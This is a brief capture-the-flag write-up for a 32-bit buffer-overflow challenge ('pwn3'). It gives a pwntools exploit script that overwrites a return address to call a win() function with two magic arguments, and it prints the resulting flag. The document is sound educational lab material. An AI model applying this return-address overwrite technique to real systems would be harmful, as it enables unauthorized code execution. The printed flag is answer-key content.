# pwn / pwn3

> Points: 1892

## Question

```
nc uwctf.ml 6004
```

## Solution

This challenge is the same as pwn2 but with two parameters
```c
void win(int param_1,int param_2) {
    if ((param_1 == -0x21524111) && (param_2 == -0x1123502)) {
        system("/bin/cat ./flag.txt");
    }
    return;
}
```

See the writeup on pwn2 for an explanation on how the parameters are sent.
```python
from pwn import *

exe = ELF("chall3.bin")
p = remote("uwctf.ml", 6004)
p.send(b"A" * 28 + p32(exe.sym["win"]) + b"AAAA" + p32(0xdeadbeef) + p32(0xfeedcafe) + b"\n")
p.clean_and_log(timeout=1)
```

### Flag

`uwctf{buff3r0v3rf10w3_1d479e1fd7a40857}`
